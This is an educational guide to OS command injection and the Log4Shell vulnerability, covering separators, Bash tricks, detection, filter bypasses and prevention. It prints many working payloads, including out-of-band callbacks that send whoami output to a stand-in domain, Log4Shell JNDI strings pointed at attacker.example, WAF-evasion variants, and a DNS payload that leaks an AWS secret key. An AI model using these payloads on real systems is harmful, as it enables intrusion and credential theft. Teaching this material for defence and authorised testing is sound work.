# Command Injection & Log4Shell

> **⚠️ AUTHORIZED USE ONLY.** This material is for education and authorized security testing. Command injection executes code on the target host, so use these techniques only on systems you own or that are explicitly in scope for an authorized engagement. Out-of-band callbacks send data to infrastructure you control; never point them at third parties. Log4Shell payloads trigger outbound connections and remote class loading, so replay them only in an isolated lab. See the [Legal and Terms of Use](/legal) page.

> "In cybersecurity, knowledge is power. Knowing how systems can be broken is the first step to defending them."

**Scope:** OS command injection end to end: how untrusted input reaches a shell, separators and Bash operators, special variables, IFS manipulation, detection including blind and out-of-band, filter bypasses, and prevention. Includes a full breakdown of CVE-2021-44228 (Log4Shell) as the highest-profile injection-to-RCE case study.

## Table of Contents
- [Core Vocabulary](#core-vocabulary)
- [What Command Injection Is](#what-command-injection-is)
- [How It Works](#how-it-works)
- [Vulnerable Functions by Language](#vulnerable-functions-by-language)
- [Command Separators](#command-separators)
- [Operators: && vs ; and the Rest](#operators-vs-and-the-rest)
- [Bash Special Variables](#bash-special-variables)
- [IFS Explained](#ifs-explained)
- [IFS Manipulation](#ifs-manipulation)
- [Attack Vectors](#attack-vectors)
- [Detection: In-Band](#detection-in-band)
- [Detection: Blind and Out-of-Band](#detection-blind-and-out-of-band)
- [Filter Bypass Tricks](#filter-bypass-tricks)
- [Impact](#impact)
- [Log4Shell: What CVE-2021-44228 Is](#log4shell-what-cve-2021-44228-is)
- [The Log4Shell Exploitation Chain](#the-log4shell-exploitation-chain)
- [Log4Shell Payloads and WAF Bypass](#log4shell-payloads-and-waf-bypass)
- [The Log4j CVE Chain and Remediation](#the-log4j-cve-chain-and-remediation)
- [Prevention](#prevention)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. Core Vocabulary

| Term | Meaning |
|------|---------|
| **Command injection** | Injecting OS commands into input that reaches a system shell |
| **Code injection** | Injecting code into the application's own language interpreter |
| **Separator** | A character that ends one command so another can begin |
| **In-band** | Command output is returned in the application response |
| **Blind** | No output returned; confirmed by timing or an out-of-band callback |
| **OAST** | Out-of-band application security testing, detection via a callback you control |
| **Shell metacharacter** | A character the shell treats specially (`;`, `\|`, `&`, `$`, backtick) |
| **IFS** | Internal Field Separator, the characters Bash splits words on |
| **JNDI** | Java Naming and Directory Interface, the lookup mechanism abused by Log4Shell |
| **CWE-78** | OS Command Injection |

**The root cause, in one line:** the application builds a shell command string by concatenating untrusted input, so the shell parses that input as **syntax** rather than treating it as **data**.

## 2. What Command Injection Is

Command injection occurs when an application passes user-controlled data into a system shell. Because the shell interprets metacharacters, input containing `;` or `|` ends the intended command and begins the attacker's.

The result is **direct code execution on the host**, with the privileges of the web server or application process. Unlike SQL injection, which reaches the database, command injection reaches the operating system itself, which is why it is consistently rated critical.

It is classified as **CWE-78** and falls under **A05:2025 Injection** in the current OWASP Top 10 (A03 in the 2021 edition).

### Distinguish it from code injection

| | Command injection | Code injection |
|---|-------------------|----------------|
| **Reaches** | The OS shell | The application's own interpreter |
| **Payload** | Shell syntax (`; id`) | Language syntax (`eval`, `${...}`) |
| **Example** | `ping -c 1 $ip` with `ip="8.8.8.8; id"` | PHP `eval($_GET['x'])`, Log4Shell's `${jndi:...}` |
| **CWE** | CWE-78 | CWE-94 |

Both end in execution, and both come from the same root cause: untrusted input reaching an evaluator.

## 3. How It Works

### The vulnerable pattern

```php
// VULNERABLE: user input concatenated into a shell command
<?php
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
?>
```

Normal use:

```text
?ip=8.8.8.8          →  ping -c 1 8.8.8.8
```

Injected:

```text
?ip=8.8.8.8; id      →  ping -c 1 8.8.8.8; id
```

The shell sees two commands separated by `;`. It runs the ping, then runs `id`. The attacker's text was parsed as syntax.

```text
?ip=8.8.8.8 | whoami           pipe: output of ping feeds whoami
?ip=8.8.8.8 && cat /etc/passwd  run second command if first succeeds
?ip=; cat /etc/passwd #         terminate, run, comment out the remainder
```

### The two ingredients

Command injection requires both:

1. **User input reaches a shell-invoking function**, and
2. **The input is not neutralized** (no argument array, no escaping, no allow-list).

Remove either and the vulnerability disappears. Section 19 shows why removing the shell entirely is the strongest fix.

## 4. Vulnerable Functions by Language

Knowing these speeds up both code review and exploitation.

| Language | Dangerous functions |
|----------|--------------------|
| **PHP** | `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`, `` `backticks` ``, `pcntl_exec()` |
| **Python** | `os.system()`, `os.popen()`, `subprocess.*` **with `shell=True`**, `commands.*` |
| **Node.js** | `child_process.exec()`, `execSync()`, `spawn()` with `{shell: true}` |
| **Java** | `Runtime.getRuntime().exec()` with a shell string, `ProcessBuilder` invoking `sh -c` |
| **Ruby** | `system()`, `exec()`, `` `backticks` ``, `%x[]`, `open()` with a pipe |
| **Perl** | `system()`, `exec()`, backticks, `open()` with a pipe |
| **Go** | `exec.Command("sh", "-c", input)` |

**The pattern to look for in review:** any of these functions receiving a **string built with concatenation or interpolation** that includes request data. In Python and Node, the specific red flag is `shell=True` and `{shell: true}`, which is what routes the string through a shell rather than executing a binary directly.

## 5. Command Separators

Injecting requires a character that ends the current command. Test each, because filters often block some and miss others.

| Separator | Behavior | Platform |
|-----------|----------|----------|
| `;` | Run sequentially, regardless of result | Unix |
| `&&` | Run next only if the previous succeeded | Both |
| `\|\|` | Run next only if the previous failed | Both |
| `\|` | Pipe output into the next command | Both |
| `&` | Run in background | Both |
| `\n` (`%0a`) | Newline, acts as a separator | Unix |
| `` `cmd` `` | Command substitution (legacy) | Unix |
| `$(cmd)` | Command substitution (preferred) | Unix |
| `%0a`, `%0d` | URL-encoded newline and carriage return | Both |

### Useful test strings

```text
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
'; id; '
"; id; "
```

Wrap in quotes when the input lands inside a quoted argument, since you must close the quote before your command is seen as separate.

### Windows separators

```text
& dir
&& dir
| dir
%0a dir
```

Windows `cmd.exe` has no backticks or `$()`, but `&`, `&&`, `||`, and `|` all work.

## 6. Operators: && vs ; and the Rest

A named objective, and a genuinely useful distinction in practice.

| Operator | Runs the next command | Use when |
|----------|----------------------|----------|
| `;` | **Always**, regardless of the previous exit status | You want your command to run even if the original fails |
| `&&` | **Only if the previous succeeded** (exit code 0) | The original command will succeed and you want clean output |
| `\|\|` | **Only if the previous failed** (non-zero) | The original will fail, for example with invalid input |
| `&` | Immediately, in the background | You do not need to wait for output |
| `\|` | Feeds the previous output as input | Chaining, or when other separators are filtered |

### Why this matters when exploiting

Suppose the injection point is `ping -c 1 <input>`:

```bash
8.8.8.8; id        # ping works, then id runs. Reliable
8.8.8.8 && id      # ping succeeds, so id runs
invalid && id      # ping fails, id does NOT run
invalid || id      # ping fails, so id DOES run
```

If your payload produces an invalid argument for the original command, **`||` is the operator that still fires**. If the original command succeeds cleanly, `&&` works and keeps output tidy. `;` works in both cases, which makes it the default first test.

### Exit codes underneath

```bash
command; echo $?    # 0 means success, non-zero means failure
```

`&&` and `||` are both making a decision based on `$?`. Understanding that is what lets you pick the right operator when a payload is not firing.

## 7. Bash Special Variables

Special variables matter for two reasons: they appear constantly in scripts you are reviewing, and several are useful for **filter evasion** because they expand to nothing or to useful characters.

| Variable | Meaning |
|----------|---------|
| `$0` | Name of the shell or script |
| `$1`, `$2`, ... | Positional arguments |
| `$#` | Number of arguments |
| `$@` | All arguments, as separate words |
| `$*` | All arguments, as a single word |
| `$?` | Exit status of the last command |
| `$$` | PID of the current shell |
| `$!` | PID of the last background command |
| `$_` | Last argument of the previous command |
| `$IFS` | Internal Field Separator |
| `$HOME`, `$PATH`, `$USER` | Standard environment variables |

### The evasion-relevant ones

In a non-script context, several of these **expand to an empty string**, letting you split a blocked keyword without changing what runs:

```bash
w$@hoami            # $@ is empty here, so this runs whoami
w${x}hoami          # x is unset, expands to nothing
c$@at /etc/passwd   # runs cat
echo $0             # reveals the shell in use, useful recon
```

`${PATH:0:1}` yields `/` without typing a slash, useful where `/` is filtered:

```bash
cat ${PATH:0:1}etc${PATH:0:1}passwd     # cat /etc/passwd
```

## 8. IFS Explained

**IFS (Internal Field Separator)** is the Bash variable holding the characters used to split a line into words. Its default value is **space, tab, and newline**.

```bash
echo "$IFS" | od -c        # shows \40 (space) \11 (tab) \12 (newline)
```

### What it does

When Bash performs word splitting (step 6 of expansion), it cuts the text at any IFS character:

```bash
data="one two three"
for w in $data; do echo "$w"; done      # three lines: splits on spaces
```

Change IFS and the splitting changes:

```bash
IFS=','
data="one,two,three"
for w in $data; do echo "$w"; done      # three lines: now splits on commas
```

### Why it matters for security

Two reasons:

1. **Offensively**, `${IFS}` expands to a space, which lets you write a command with arguments when the literal space character is filtered.
2. **Defensively**, a script that does not reset IFS or quote its variables can be manipulated by an attacker who controls the environment, causing unintended word splitting. This is why hardened scripts set `IFS=$'\n\t'` and quote every expansion.

## 9. IFS Manipulation

The practical use in exploitation: **producing a space without typing one.**

```bash
cat${IFS}/etc/passwd            # IFS expands to a space
cat$IFS/etc/passwd              # works where the brace form is filtered
cat${IFS}${IFS}/etc/passwd      # multiple, still fine
```

### The `$IFS$9` trick

```bash
cat$IFS$9/etc/passwd
```

`$9` is the ninth positional argument, which is empty in this context. It acts as a delimiter so Bash parses `$IFS` as the complete variable name rather than trying to read `$IFS/etc` or similar. This is the most portable form and the one to reach for first.

### Other ways to get a space

| Technique | Example |
|-----------|---------|
| **Brace expansion** | `{cat,/etc/passwd}` |
| **Tab character** | `cat%09/etc/passwd` (URL-encoded tab) |
| **Redirection** | `cat</etc/passwd` |
| **Newline** | `cat%0a/etc/passwd` |
| **Set IFS yourself** | `IFS=,;cat,/etc/passwd` |

Brace expansion is often the cleanest: `{cat,/etc/passwd}` expands to `cat /etc/passwd` with no space in the payload at all.

## 10. Attack Vectors

Any input that reaches a shell-invoking function is a vector. These are the recurring ones.

| Vector | Why it reaches a shell |
|--------|------------------------|
| **Network diagnostic tools** | Ping, traceroute, nslookup, whois features in admin panels |
| **File operations** | Archive extraction, conversion, compression using CLI tools |
| **Image and media processing** | Wrappers around ImageMagick, ffmpeg, exiftool |
| **PDF and document conversion** | Wrappers around wkhtmltopdf, LibreOffice, pandoc |
| **Backup and export features** | Shelling out to `tar`, `mysqldump`, `zip` |
| **System administration panels** | Service restart, log viewing, disk usage |
| **Filename handling** | Uploaded filenames used in shell commands |
| **Git and version control integrations** | Repository URLs passed to `git` |
| **Log processing** | Log values used in shell pipelines |
| **Environment variables and headers** | Values placed into commands, including `User-Agent` and `Referer` |

**High-value target:** anything that wraps a **command-line utility**. If a feature does something a CLI tool does (resize an image, convert a document, ping a host), there is a good chance a shell is involved.

## 11. Detection: In-Band

In-band means the command output appears in the application response, which makes confirmation immediate.

### Test progression

```text
1. Baseline:     8.8.8.8              (normal behavior)
2. Separator:    8.8.8.8; id          (look for uid= in the response)
3. Alternates:   8.8.8.8 | id
                 8.8.8.8 && id
                 8.8.8.8 || id
                 8.8.8.8 `id`
                 8.8.8.8 $(id)
4. Quoted:       8.8.8.8'; id; '
                 8.8.8.8"; id; "
```

### Confirmation commands

| Command | Confirms |
|---------|----------|
| `id` | Execution and the user context |
| `whoami` | The account running the application |
| `uname -a` | OS and kernel |
| `pwd` | Working directory |
| `hostname` | Host identity |

`id` is the standard first choice: short, harmless, universally present, and its `uid=` output is unmistakable in a response.

## 12. Detection: Blind and Out-of-Band

Most real command injection is blind: the command runs but nothing is returned. Two reliable channels confirm it.

### Time-based

Force a measurable delay on success.

```bash
8.8.8.8; sleep 10
8.8.8.8 && sleep 10
8.8.8.8 || sleep 10
8.8.8.8 & sleep 10
```

A 10-second response where the baseline was instant confirms execution. Windows equivalent:

```text
& timeout /t 10
& ping -n 10 127.0.0.1
```

Vary the duration (5s, then 10s, then 15s) to rule out coincidental latency. If response time tracks your value, it is real.

### Out-of-band (OAST)

Make the target contact infrastructure you control, which also proves outbound connectivity.

```bash
; curl http://YOUR-OAST-DOMAIN/
; wget http://YOUR-OAST-DOMAIN/
; nslookup YOUR-OAST-DOMAIN
; ping -c 1 YOUR-OAST-DOMAIN
```

**DNS is the most reliable channel**, because egress filtering frequently blocks outbound HTTP but permits DNS resolution.

### Exfiltrating output out of band

```bash
; nslookup `whoami`.YOUR-OAST-DOMAIN
; curl http://YOUR-OAST-DOMAIN/$(whoami)
```

The command output becomes part of the hostname or path, so it appears in your callback log. Note that DNS labels have length limits and disallow many characters, so encode the output first (for example with base64) when it is not a simple short string.

### Tooling

| Tool | Notes |
|------|-------|
| **Burp Collaborator** | Built into Burp Professional |
| **interactsh** | Open-source OAST, self-hostable, works with Burp Community |
| **Your own server** | A VPS with DNS you control plus `tcpdump` or a listener |

## 13. Filter Bypass Tricks

Applications commonly denylist dangerous strings. These are the standard evasions, and each one demonstrates why denylisting fails.

### Splitting the keyword

```bash
w'h'oami            # quotes are removed before execution
w"h"oami
wh\oami             # backslash escape
w$@hoami            # empty variable expansion
w${x}hoami
c""at /etc/passwd
```

### Building from pieces

```bash
a=who;b=ami;$a$b
echo "d2hvYW1p" | base64 -d | sh        # decode and run
$(echo 'aWQ=' | base64 -d)
```

### Globbing the path

```bash
/bin/c?t /etc/passwd        # ? matches one character
/bin/ca* /etc/passwd        # * wildcard
/???/c?t /etc/passwd        # both path and name
/bin/c[a]t /etc/passwd      # character class
```

### Getting spaces (see Section 9)

```bash
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

### Avoiding slashes

```bash
cat ${PATH:0:1}etc${PATH:0:1}passwd
cat ${HOME:0:1}...            # depends on the variable's value
```

### Encoding

```text
%0a          newline separator
%09          tab, substitutes for a space
%26          &
%3B          ;
%7C          |
```

Double encoding (`%253B`) is worth testing wherever a value passes through more than one decoding layer.

### Case and comments

```bash
WhOaMi                       # only helps where the filter is case-sensitive
cat /etc/passwd #comment     # comment out an appended suffix
```

## 14. Impact

Command injection is rated critical because it lands on the operating system, not just the application.

| Impact | Detail |
|--------|--------|
| **Arbitrary code execution** | Run any command as the application user |
| **Full file access** | Read, modify, or delete anything that user can reach |
| **Credential theft** | Config files, environment variables, SSH keys, cloud credentials |
| **Reverse shell** | Interactive access to the host |
| **Persistence** | Cron jobs, SSH keys, service modification |
| **Lateral movement** | The host becomes a pivot into the internal network |
| **Privilege escalation** | Combined with a local flaw, leads to root |
| **Data destruction** | Deleting data or backups |
| **Cryptomining and botnet enrollment** | The most common opportunistic outcome |

**Assume escalation.** Application processes frequently have more access than expected: database credentials in environment variables, cloud instance roles, mounted shares, and network reachability to internal systems. Rate command injection as critical by default.

## 15. Log4Shell: What CVE-2021-44228 Is

Log4Shell is the highest-profile injection vulnerability of the last decade, and the clearest demonstration that **injection is not only about shells**.

| Field | Value |
|-------|-------|
| **CVE** | CVE-2021-44228 |
| **Name** | Log4Shell |
| **Component** | Apache Log4j 2, a near-ubiquitous Java logging library |
| **Affected versions** | 2.0-beta9 through 2.14.1 |
| **CVSS** | 10.0, the maximum score |
| **Disclosed** | December 2021 |
| **Fixed in** | 2.15.0 initially, but see Section 18, the full fix is 2.17.1 |

### The one-line summary

A vulnerable version of Log4j, when it **logs a string containing `${jndi:ldap://attacker/x}`**, performs a JNDI lookup to the attacker's server, downloads a remote Java class, and executes it. Logging attacker-controlled text was enough to achieve remote code execution.

### An important accuracy note

Log4Shell is **not OS command injection**. It is **expression and lookup injection leading to remote class loading**, which then results in RCE. It belongs in this material because it shares the identical root cause and teaches the same lesson:

```text
Untrusted input reached an evaluator that treated it as instructions.
```

In classic command injection the evaluator is the shell. In Log4Shell it is Log4j's message-lookup feature. The category differs; the mistake is the same.

### Why it was so severe

- **Trivial to exploit:** a single string, no authentication, no special skill.
- **Enormous reach:** Log4j is a transitive dependency in a huge share of Java software, so most affected organizations did not know they used it.
- **Any logged field was a vector:** username, `User-Agent`, `X-Forwarded-For`, chat messages, search terms, even a device name. Anything that reached a log.
- **Pre-authentication:** login forms log failed usernames, so the payload landed before any authentication.

## 16. The Log4Shell Exploitation Chain

```text
[1] Attacker sends ${jndi:ldap://attacker.example/x} in any logged field
      ↓
[2] The application logs the string
      ↓
[3] Log4j's lookup feature parses ${...} and resolves it
      ↓
[4] JNDI performs an LDAP request to attacker.example
      ↓
[5] The attacker's LDAP server responds with a reference to a remote Java class
      ↓
[6] The JVM downloads that class
      ↓
[7] The class is instantiated and its code executes
      ↓
[8] Remote code execution on the victim host
```

### The two mechanisms that combined

| Mechanism | Role |
|-----------|------|
| **Message lookups** | Log4j substituted `${...}` expressions inside logged messages, including attacker-supplied ones |
| **JNDI + remote class loading** | JNDI resolved the URL and the JVM loaded and ran the returned class |

Neither alone is fatal. Together, logging untrusted text became code execution. This is why the eventual fix disabled message lookups entirely rather than trying to sanitize them.

## 17. Log4Shell Payloads and WAF Bypass

For lab and detection-engineering use. These are the signatures defenders needed to recognize.

### The base payload

```text
${jndi:ldap://attacker.example/a}
${jndi:rmi://attacker.example/a}
${jndi:dns://attacker.example/a}
${jndi:ldaps://attacker.example/a}
```

### Where it was placed

```http
GET / HTTP/1.1
Host: target.example
User-Agent: ${jndi:ldap://attacker.example/a}
X-Forwarded-For: ${jndi:ldap://attacker.example/a}
Referer: ${jndi:ldap://attacker.example/a}
```

Also in usernames, search fields, form inputs, chat messages, filenames, and any API parameter that eventually reached a log statement.

### Obfuscation that defeated naive WAF rules

Log4j's own lookup features could be nested to rebuild the string at evaluation time, so the literal text `jndi` never appeared:

```text
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/a}
${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.example/a}
${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.example/a}
${${env:BARFOO:-j}ndi:ldap://attacker.example/a}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.example/a}
```

**The lesson for defenders:** string-matching `jndi` was never a real fix, because the feature being abused could reassemble the string from parts. WAF rules bought time; only patching and disabling lookups closed it.

### Data exfiltration without class loading

Even where remote class loading was blocked, the lookup itself leaked data through the DNS query:

```text
${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker.example/a}
```

The environment variable was resolved into the hostname before the query, so it appeared in the attacker's DNS log. This is why a mere DNS callback from a Log4Shell test is a serious finding, not a partial one.

## 18. The Log4j CVE Chain and Remediation

The fix took four attempts, which is itself an instructive story about incomplete patching.

| CVE | Issue | Affected | CVSS | Fixed in |
|-----|-------|----------|------|----------|
| **CVE-2021-44228** | The original Log4Shell RCE via JNDI lookup | 2.0-beta9 to 2.14.1 | **10.0** | 2.15.0 |
| **CVE-2021-45046** | Incomplete fix; RCE and information leak in some configurations | 2.0-beta9 to 2.15.0 | **9.0** (raised from 3.7) | 2.16.0 |
| **CVE-2021-45105** | Denial of service via uncontrolled recursion in self-referential lookups | 2.0-beta9 to 2.16.0 | 5.9 to 7.5 | 2.17.0 |
| **CVE-2021-44832** | RCE via a JDBC Appender, requires config-modification access | 2.0-beta7 to 2.17.0 | 6.6 | 2.17.1 |

### What each version actually changed

| Version | Change |
|---------|--------|
| **2.15.0** | Restricted JNDI lookups. Incomplete |
| **2.16.0** | **Removed message lookups entirely** and disabled JNDI by default |
| **2.17.0** | Fixed the recursion DoS and limited JNDI to the `java` protocol |
| **2.17.1** | Fixed the JDBC Appender vector. **The recommended target version** |

Java 7 and Java 6 users received equivalent fixes in the 2.12.x and 2.3.x lines, culminating in **2.12.4** and **2.3.2**.

### Remediation, in priority order

| Priority | Action |
|----------|--------|
| **1** | **Upgrade to 2.17.1 or later** (or 2.12.4 / 2.3.2 for older Java). The only complete fix |
| **2** | **Remove the `JndiLookup` class** from the JAR where upgrading is impossible |
| **3** | **Inventory dependencies**, including transitive ones. Most organizations did not know where Log4j was |
| **4** | **Egress filtering** to block outbound LDAP and RMI from application servers |
| **5** | **WAF rules** as temporary cover only, given the obfuscation in Section 17 |
| **6** | **Hunt for prior exploitation**, since scanning began within hours of disclosure |

The `formatMsgNoLookups=true` flag was widely recommended early on but is **incomplete** and was not sufficient for CVE-2021-45046. Do not treat it as a fix.

### The lasting lessons

- **Transitive dependencies are attack surface.** You cannot patch what you do not know you ship. This is why SBOM (Software Bill of Materials) became a priority afterward, and why **Software Supply Chain Failures** is now its own category (A03) in the OWASP Top 10:2025.
- **A feature became a vulnerability.** Lookups were intended functionality. Powerful features applied to untrusted input are a vulnerability class in themselves.
- **The first patch is not always the fix.** Four CVEs and four releases were needed. Track the full chain, not the first advisory.

## 19. Prevention

### The primary fix: do not use a shell

The strongest defense is to remove the shell from the path entirely by passing arguments as an **array** rather than a string. When there is no shell, there are no metacharacters to interpret.

```python
# VULNERABLE: string goes through a shell
import os, subprocess
os.system("ping -c 1 " + user_input)
subprocess.run("ping -c 1 " + user_input, shell=True)

# SECURE: argument array, no shell involved
subprocess.run(["ping", "-c", "1", user_input], shell=False)
```

```javascript
// VULNERABLE
child_process.exec(`ping -c 1 ${userInput}`);

// SECURE: execFile passes arguments directly
child_process.execFile('ping', ['-c', '1', userInput]);
```

```php
// VULNERABLE
system("ping -c 1 " . $ip);

// SAFER: escape the argument (see the caveat below)
system("ping -c 1 " . escapeshellarg($ip));
```

With an argument array, `8.8.8.8; id` is passed to `ping` as a **single literal argument**. Ping fails to resolve it and reports an error. Nothing executes, because nothing parsed it as syntax.

### If a shell is unavoidable

| Control | Detail |
|---------|--------|
| **Allow-list the input** | Accept only known-good values, ideally mapping a key to a fixed command |
| **Strict validation** | Anchored regex such as `^[0-9.]+$` for an IP, rejecting everything else |
| **Escape properly** | PHP's `escapeshellarg()` per argument. Note `escapeshellcmd()` is weaker and has known bypasses |
| **Never denylist** | Section 13 shows why blocking metacharacters cannot be complete |

### The allow-list pattern

```python
ALLOWED = {
    "status": ["systemctl", "is-active", "nginx"],
    "uptime": ["uptime"],
}
action = request.args.get("action")
if action not in ALLOWED:
    abort(400)
subprocess.run(ALLOWED[action], shell=False)
```

The user supplies a **key**, never any part of the command. No metacharacter, encoding, or IFS trick applies, because the input never reaches a command string.

### Defense in depth

| Layer | Role |
|-------|------|
| **No shell (argument arrays)** | The primary fix |
| **Allow-listing** | When a command must be dynamic |
| **Least privilege** | Run the app as an unprivileged user so execution gains little |
| **Containerization and sandboxing** | Contain the blast radius |
| **Egress filtering** | Blocks reverse shells and OAST exfiltration |
| **Disable unused interpreters** | Reduce what a payload can call |
| **Logging and alerting** | Detect execution attempts |
| **Dependency management and SBOM** | Catch injectable third-party components, the Log4Shell lesson |

## 20. Fast Recall

- **Command injection** is untrusted input reaching an OS shell, so the shell parses it as syntax. **CWE-78**, **A05:2025 Injection** (A03 in 2021).
- **It reaches the operating system**, not just the database, which is why it rates critical by default.
- **Separators to test:** `;`, `&&`, `||`, `|`, `&`, newline (`%0a`), backticks, `$()`.
- **`;` always runs the next command. `&&` runs it only on success. `||` runs it only on failure.** If your payload breaks the original command, `||` still fires.
- **Bash special variables:** `$0` shell name, `$#` arg count, `$@` all args, `$?` last exit status, `$$` PID, `$IFS` field separator.
- **`$@` and `${x}` expand to nothing**, so `w$@hoami` runs `whoami` past a keyword filter.
- **IFS is the Internal Field Separator**, default space, tab, newline. It controls word splitting.
- **`${IFS}` produces a space** where spaces are filtered. `cat$IFS$9/etc/passwd` is the most portable form.
- **Alternatives to a space:** `{cat,/etc/passwd}`, `cat</etc/passwd`, `%09` tab, `%0a` newline.
- **Vulnerable functions:** PHP `system`/`exec`/`shell_exec`, Python `os.system` and `subprocess` with **`shell=True`**, Node `child_process.exec`, Java `Runtime.exec`.
- **Blind detection:** `sleep 10` for timing, and OAST callbacks. **DNS is the most reliable channel**, since egress often blocks HTTP but allows DNS.
- **Exfiltrate out of band** by putting output in a hostname: `nslookup \`whoami\`.your-oast-domain`.
- **Bypasses:** quote splitting `w'h'oami`, globbing `/bin/c?t`, base64 decode-and-pipe, `${PATH:0:1}` for `/`.
- **Log4Shell is CVE-2021-44228**, CVSS **10.0**, Log4j **2.0-beta9 to 2.14.1**, disclosed December 2021.
- **It is lookup injection, not command injection**, but the same root cause: input reached an evaluator.
- **The payload `${jndi:ldap://attacker/x}` in any logged field** triggered a JNDI lookup, remote class load, and RCE. Pre-authentication, since failed logins get logged.
- **WAF string-matching failed** because Log4j lookups could rebuild `jndi` from parts: `${${lower:j}${lower:n}...}`.
- **Four CVEs, four releases:** 44228 (2.15.0), 45046 (2.16.0), 45105 (2.17.0), 44832 (**2.17.1, the target version**).
- **`formatMsgNoLookups` is not a complete fix.** Upgrade, or remove the `JndiLookup` class.
- **The fix for command injection is to remove the shell:** pass arguments as an array (`shell=False`, `execFile`), never a concatenated string.

## 21. Resources

**Command injection**
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP: OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [MITRE CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PortSwigger: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

**Bash reference**
- [GNU Bash Manual: Special Parameters](https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html)
- [GNU Bash Manual: Word Splitting and IFS](https://www.gnu.org/software/bash/manual/html_node/Word-Splitting.html)
- [Greg's Wiki: BashGuide](https://mywiki.wooledge.org/BashGuide)

**Log4Shell**
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CISA: Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
- [NVD: CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [MITRE CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html)

**Out-of-band testing**
- [interactsh](https://github.com/projectdiscovery/interactsh)
- [Burp Suite Collaborator](https://portswigger.net/burp/documentation/collaborator)

**Practice (authorized labs)**
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [DVWA](https://github.com/digininja/DVWA)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
